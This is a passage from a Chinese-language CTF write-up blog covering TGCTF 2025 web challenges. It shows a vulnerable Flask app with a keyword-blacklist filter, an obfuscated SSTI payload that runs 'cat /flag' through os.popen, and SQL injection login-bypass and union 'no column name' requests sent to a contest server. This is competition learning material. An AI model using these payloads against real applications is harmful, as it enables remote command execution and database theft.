</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">black_list</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;lipsum&#39;</span><span class="p">,</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="s1">&#39;%&#39;</span><span class="p">,</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;map&#39;</span><span class="p">,</span><span class="s1">&#39;chr&#39;</span><span class="p">,</span> <span class="s1">&#39;value&#39;</span><span class="p">,</span> <span class="s1">&#39;get&#39;</span><span class="p">,</span> <span class="s2">&#34;url&#34;</span><span class="p">,</span> <span class="s1">&#39;pop&#39;</span><span class="p">,</span><span class="s1">&#39;include&#39;</span><span class="p">,</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="s1">&#39;base&#39;</span><span class="p">,</span><span class="s1">&#39;globals&#39;</span><span class="p">,</span><span class="s1">&#39;_.&#39;</span><span class="p">,</span><span class="s1">&#39;set&#39;</span><span class="p">,</span><span class="s1">&#39;application&#39;</span><span class="p">,</span><span class="s1">&#39;getitem&#39;</span><span class="p">,</span><span class="s1">&#39;request&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;init&#39;</span><span class="p">,</span> <span class="s1">&#39;arg&#39;</span><span class="p">,</span> <span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">is_typable</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="c1"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">typable_chars</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">whitespace</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">return</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">typable_chars</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="n">send_from_directory</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/jingu&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">def</span> <span class="nf">greet</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">template1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="n">template2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">k</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="k">if</span> <span class="n">is_typable</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="n">k</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="k">if</span> <span class="n">k</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">secret_key</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="n">name</span> <span class="ow">and</span> <span class="n">secret_key</span><span class="p">[</span><span class="mi">2</span><span class="p">:]):</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="n">å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="n">template1</span> <span class="o">=</span> <span class="s2">&#34;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ{{}}â€</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="n">æœ€å</span><span class="err">ï¼Œ</span><span class="n">å¦‚æœä½ ç”¨äº†cat</span><span class="err">ï¼Œ</span><span class="n">å°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">            <span class="n">template</span><span class="o">=</span> <span class="n">template</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;å¤©å‘½&#34;</span><span class="p">,</span><span class="s2">&#34;{{&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;éš¾è¿&#34;</span><span class="p">,</span><span class="s2">&#34;}}&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="n">template</span> <span class="o">=</span> <span class="n">template</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;cat&#34;</span> <span class="ow">in</span> <span class="n">template</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">        <span class="n">template2</span> <span class="o">=</span> <span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="n">æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­</span><span class="err">ï¼Œ</span><span class="n">çœŸçš„èƒ½åšåˆ°</span><span class="err">ï¼Ÿ</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">        <span class="k">return</span> <span class="n">template1</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span><span class="o">+</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">        <span class="n">error_message</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="p">{</span><span class="n">template</span><span class="p">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">        <span class="k">return</span> <span class="n">error_message</span><span class="p">,</span> <span class="mi">400</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">
</span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hint&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="k">def</span> <span class="nf">hinter</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">    <span class="n">template</span><span class="o">=</span><span class="s2">&#34;hintï¼š</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="n">æœ‰ä¸€ä¸ªaazzè·¯ç”±</span><span class="err">ï¼Œ</span><span class="n">å»é‚£é‡Œçœ‹çœ‹å§</span><span class="err">ï¼Œ</span><span class="n">å¤©å‘½äºº</span><span class="err">!</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">
</span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/aazz&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="k">def</span> <span class="nf">finder</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">        <span class="n">source_code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">73</span><span class="cl"><span class="p">{</span><span class="n">source_code</span><span class="p">}</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl"><span class="s2">&#34;, 200, {&#39;Content-Type&#39;: &#39;text/html; charset=utf-8&#39;}</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl">
</span></span><span class="line"><span class="ln">76</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">77</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</span></span></code></pre></div><p>æ‰“ssti</p>
<p>payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">å¤©å‘½</span><span class="p">((</span><span class="n">cycler</span><span class="o">.</span><span class="n">next</span><span class="p">[</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f</span><span class="s2">&#34;</span><span class="p">][</span><span class="s2">&#34;</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f</span><span class="s2">&#34;</span><span class="p">](</span><span class="s1">&#39;o&#39;&#39;s&#39;</span><span class="p">))[</span><span class="s1">&#39;p&#39;&#39;open&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">))[</span><span class="s1">&#39;r&#39;&#39;ead&#39;</span><span class="p">]()</span><span class="n">éš¾è¿</span>
</span></span></code></pre></div><h3 id="tgctf-2025-åå°ç®¡ç†"><strong>TGCTF 2025 åå°ç®¡ç†</strong><a hidden class="anchor" aria-hidden="true" href="#tgctf-2025-åå°ç®¡ç†">#</a></h3>
<p>é¢˜ç›®ç»™äº†åå°çš„ä¸€ä¸ªè´¦å·ï¼Œtg/tg123</p>
<p>è¿›åå°å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç”šè‡³å¯ä»¥ç›´æ¥åœ¨cookieæ”¹èº«ä»½</p>
<p>å›åˆ°ç™»å½•ç•Œé¢å°è¯•ä¸‡èƒ½å¯†ç å‘ç°æœ‰wafï¼Œé‚£åº”è¯¥è¦æ‰“sql</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124056-14.png"></p>
<p>wafäº†å•å¼•å·,é€šè¿‡è½¬ä¹‰ç»•è¿‡å³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="nv">username</span><span class="o">=</span>admin<span class="se">\&amp;</span><span class="nv">password</span><span class="o">=</span>or <span class="nv">1</span><span class="o">=</span>1#
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1744970124056-15.png"></p>
<p>å°è¯•è”åˆæ³¨å…¥ï¼Œset-cookieå¤„æœ‰å›æ˜¾</p>
<p>ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶ï¼Œåœ¨è¯»è¡¨åå¤„å¡äº†å¾ˆä¹…</p>
<p>åé¢ç›´æ¥çŒœè¡¨åæ˜¯flagï¼Œç›´æ¥æ‰“æ— åˆ—å</p>
<p><a href="https://www.cnblogs.com/q1stop/p/18024992">https://www.cnblogs.com/q1stop/p/18024992</a></p>
<p>åˆ©ç”¨joinæ‰“æ— åˆ—å</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">POST /login HTTP/1.1
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Host: 124.71.147.99:9045
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Cache-Control: max-age<span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Origin: http://124.71.147.99:9045
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/135.0.0.0 Safari/537.36
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Referer: http://124.71.147.99:9045/login
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="ln">10</span><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
</span></span><span class="line"><span class="ln">12</span><span class="cl">Content-Length: <span class="m">25</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">username</span><span class="o">=</span>admin<span class="se">\&amp;</span><span class="nv">password</span><span class="o">={{</span>urlenc<span class="o">(</span>union <span class="k">select</span> * from <span class="o">(</span><span class="k">select</span> * from flag a join flag b<span class="o">)</span>c#<span class="o">)}}</span>
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1744970124056-16.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">POST /login HTTP/1.1
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Host: 124.71.147.99:9045
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Cache-Control: max-age<span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Origin: http://124.71.147.99:9045
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/135.0.0.0 Safari/537.36
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Referer: http://124.71.147.99:9045/login
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="ln">10</span><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7
</span></span><span class="line"><span class="ln">12</span><span class="cl">Content-Length: <span class="m">25</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">username</span><span class="o">=</span>admin<span class="se">\&amp;</span><span class="nv">password</span><span class="o">={{</span>urlenc<span class="o">(</span>union <span class="k">select</span> value,2 from flag#<span class="o">)}}</span>
</span></span></code></pre></div><p><img alt="img" loading="lazy" src="../assets/1744970124056-17.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">TGCTF<span class="o">{</span>ac4ca16f-f1508c-000342<span class="o">}</span>
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E7%BD%91%E9%BC%8E2022%E5%A4%8D%E7%9B%98-writeup/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>æ˜¥ç§‹äº‘é•œ-ç½‘é¼2022åŠå†³å¤ç›˜-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/xyctf_2025/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>XYCTF-2025-Web-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
